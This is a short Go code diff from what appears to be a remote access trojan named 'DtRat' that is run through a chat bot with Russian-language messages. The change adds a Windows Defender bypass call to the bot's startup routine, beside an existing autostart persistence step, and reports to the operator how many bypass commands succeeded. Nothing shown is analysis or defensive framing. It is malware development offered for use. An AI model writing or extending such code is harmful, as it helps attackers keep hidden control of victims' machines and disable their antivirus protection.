@@ -17,13 +17,16 @@ func errToStatus(err error) string {
 func (r *Rat) startCmd() {
 	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.\n\nНачата первоначальная инициализация.", config.Version)
 	err := r.Hider.AddToStartup()
+	suc, total := r.Engine.System.BypassDefender()
 
 	doneTxt :=
 		`
 Инициализация завершена!
-Добавление в автозапуск: %s`
+Добавление в автозапуск: %s
+Обход Windows Defender: %d из %d команд успешно выполнены.
+`
 
-	r.Bot.Send(doneTxt, errToStatus(err))
+	r.Bot.Send(doneTxt, errToStatus(err), suc, total)
 }
 
 func (r *Rat) defaultCmd() {
